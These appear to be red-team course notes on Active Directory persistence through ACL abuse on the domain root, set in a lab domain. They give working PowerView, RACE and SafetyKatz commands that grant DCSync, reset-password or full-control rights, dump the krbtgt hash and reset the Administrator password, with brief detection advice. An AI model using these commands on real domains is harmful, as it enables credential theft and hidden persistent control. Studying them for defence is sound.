# Persistence — ACL Rights Abuse (Domain Root)

**Date:** 06 August 2026


---

## What is Rights Abuse?

Modifying ACLs on domain objects to grant dangerous permissions to unprivileged users.

**Targets:** Domain root, OUs, groups, user objects

**Permissions:** FullControl, DCSync, ResetPassword, WriteMembers, etc.

---

## Why ACL Rights Abuse Works

✅ **Persistent** — survives password changes  
✅ **Invisible** — user not in any group  
✅ **Powerful** — grants admin-like capabilities  
✅ **Silent** — no privilege escalation needed once set  
✅ **Flexible** — can target any AD object  

---

## Attack: Add FullControl on Domain Root

**Method 1: PowerView**

```powershell
Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' 
  -PrincipalIdentity student1 
  -Rights All 
  -PrincipalDomain dollarcorp.moneycorp.local 
  -TargetDomain dollarcorp.moneycorp.local 
  -Verbose
```

**Parameters:**
- `-TargetIdentity` — Domain root DN
- `-PrincipalIdentity` — User to grant permissions
- `-Rights All` — FullControl (all permissions)
- `-PrincipalDomain` — Domain of user
- `-TargetDomain` — Target domain

---

**Method 2: RACE Toolkit**

```powershell
Set-ADACL -SamAccountName studentuser1 
  -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local'
  -Right GenericAll 
  -Verbose
```

**Parameters:**
- `-SamAccountName` — User (SAM format)
- `-DistinguishedName` — Domain root DN
- `-Right GenericAll` — FullControl

---

## Permissions Grantable on Domain Root

| Permission | Capability |
|---|---|
| GenericAll / All | Full control (everything below) |
| GenericWrite | Modify object properties |
| WriteDACL | Modify ACLs (grant self admin) |
| WriteOwner | Change object owner |
| ExtendedRight: DCSync | Run DCSync (extract all hashes) |
| ExtendedRight: ResetPassword | Reset any user password |
| CreateChild | Create new objects |

---

## Attack Steps

```
1. Gain Domain Admin privileges
   ↓
2. Add user with specific right to domain root
   ↓
3. Unprivileged user now has capability
   ↓
4. User can:
   - Extract all hashes (DCSync)
   - Reset any password
   - Modify any object
   - Create backdoor accounts
   ↓
5. Persistent access regardless of password changes
```

---

## Exploit: DCSync Right

**Grant DCSync permission:**

```powershell
Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' 
  -PrincipalIdentity student1 
  -Rights ExtendedRight 
  -ExtendedRightName "Replicating Directory Changes" 
  -PrincipalDomain dollarcorp.moneycorp.local 
  -TargetDomain dollarcorp.moneycorp.local 
  -Verbose
```

**Now student1 can run DCSync:**

```powershell
SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

Extract KRBTGT hash without DA privileges.

---

## Exploit: ResetPassword Right

**Grant ResetPassword:**

```powershell
Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' 
  -PrincipalIdentity student1 
  -Rights ExtendedRight 
  -ExtendedRightName "Reset Password" 
  -PrincipalDomain dollarcorp.moneycorp.local 
  -TargetDomain dollarcorp.moneycorp.local 
  -Verbose
```

**Now student1 can reset any password:**

```powershell
Set-DomainUserPassword -Identity Administrator -AccountPassword (ConvertTo-SecureString "NewPassword@123" -AsPlainText -Force) -Verbose
```

Change Domain Admin password without knowing it.

---

## Other Interesting Rights on Domain Root

**Extended Rights available:**

```
- Replicating Directory Changes (DCSync)
- Replicating Directory Changes All (Extended DCSync)
- Reset Password
- Change Password
- Unexpire Password
- Enable Account
- Send As
- Receive As
```

---

## Target Objects Beyond Domain Root

**Can abuse ACLs on:**

| Object | Useful Permission |
|---|---|
| Domain root | Everything (FullControl) |
| OUs | Modify child objects |
| Groups | Add/remove members, reset passwords |
| User objects | ResetPassword, WriteProperty |
| Computers | WriteProperty, CreateChild |

---

## Persistence Workflow

```
1. Get Domain Admin (via escalation/exploit)
   ↓
2. Identify target object (domain root)
   ↓
3. Add user with dangerous right
   ↓
4. Remove DA privileges (downgrade)
   ↓
5. User now has persistent capability
   ↓
6. Access DC, extract hashes, reset passwords
```

---

## Why Rights Abuse is Effective

❌ **Hard to detect** — no group membership change  
❌ **Persistent** — doesn't expire  
❌ **Flexible** — can target multiple objects  
❌ **Low privilege** — normal user can exploit  
❌ **Multiple avenues** — DCSync, ResetPassword, WriteMembers  

---

## Comparison: FullControl vs Specific Rights

| Approach | Scope | Detection | Flexibility |
|---|---|---|---|
| FullControl | Everything | High | Max |
| DCSync only | Credential extraction | Low | Limited |
| ResetPassword only | Password changes | Medium | Limited |
| Multiple specific | Staged abuse | Low | High |

---

## Detection & Prevention

**Detection:**
- Monitor ACL changes on domain root (event ID 5136)
- Alert on DCSync by non-DC accounts
- Track FullControl additions to domain objects
- Audit ExtendedRight grants
- Monitor password resets by non-admins

**Prevention:**
- Restrict domain root ACL modifications
- Enable Protected Users group (limits delegation)
- Audit domain ACLs regularly
- Disable delegation (AdminCount)
- Implement tiered admin model

---

## Command Reference

| Task | Command |
|---|---|
| Add FullControl | `Add-DomainObjectAcl -TargetIdentity 'DC=...' -Rights All` |
| Add DCSync | `Add-DomainObjectAcl -Rights ExtendedRight -ExtendedRightName "Replicating Directory Changes"` |
| Add ResetPassword | `Add-DomainObjectAcl -Rights ExtendedRight -ExtendedRightName "Reset Password"` |
| Use RACE toolkit | `Set-ADACL -SamAccountName user -Right GenericAll` |
| Check ACLs | `Get-DomainObjectAcl -Identity 'DC=...' -ResolveGUIDs` |

---

## ACL Persistence Techniques Summary

| Technique | Target | Duration | Scope |
|---|---|---|---|
| AdminSDHolder | Protected groups | Indefinite | Protected groups only |
| Domain Root ACLs | Domain object | Indefinite | Everything below root |
| Custom SSP | DC LSASS | Indefinite | Credential harvesting |
| DSRM | DC local admin | Indefinite | DC access only |
| Rights Abuse | Multiple objects | Indefinite | Flexible (per grant) |

---

## Key Takeaway

```
Modify domain root ACL = Persistent capability
Add user with FullControl or specific ExtendedRight
User can:
  - Extract all hashes (DCSync)
  - Reset any password
  - Modify any object
  - Create backdoor accounts
No privilege escalation needed once ACL is set
```

---

## References

- [PowerView](https://github.com/PowerShellMafia/PowerSploit)
- [RACE Toolkit](https://github.com/samratashok/RACE)
- [Harmj0y - ACL Abuse](https://blog.harmj0y.net/redteaming/the-adminsdholder-trick/)

---

*Next: Cross-Forest Attacks & Cleanup*
